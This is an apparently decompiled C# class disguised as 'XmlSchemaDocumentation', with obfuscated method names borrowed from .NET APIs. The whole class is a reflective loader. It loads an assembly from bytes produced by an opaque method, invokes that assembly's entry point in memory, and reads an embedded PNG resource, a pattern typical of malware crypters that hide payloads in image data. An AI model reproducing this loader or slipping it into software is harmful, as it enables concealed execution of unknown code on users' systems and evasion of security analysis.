using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;

public class XmlSchemaDocumentation
{
	public static ImageFormat arizona = ImageFormat.get_Png();

	public static Assembly open = Assembly.Load(PowerModes.WriteElementTextBlockAsyncd__133());

	public static MethodInfo mentry = Assembly.Load(PowerModes.WriteElementTextBlockAsyncd__133()).EntryPoint;

	public static object CompoundAce(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(TraceEventType(entryPoint));
	}

	public static void StandardPrintController(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(CompoundAce(assembly, entryPoint), null);
	}

	public static string TraceEventType(MethodInfo entryPoint)
	{
		return (string)NodeLabelEditEventHandler(entryPoint);
	}

	public static void Datatype_ENTITY()
	{
		LicenseInteropHelper();
	}

	internal static object NodeLabelEditEventHandler(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool LicenseInteropHelper()
	{
		StandardPrintController(open, mentry);
		return true;
	}

	internal static bool AdalException()
	{
		return false;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("LinkedSlotVolatile.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
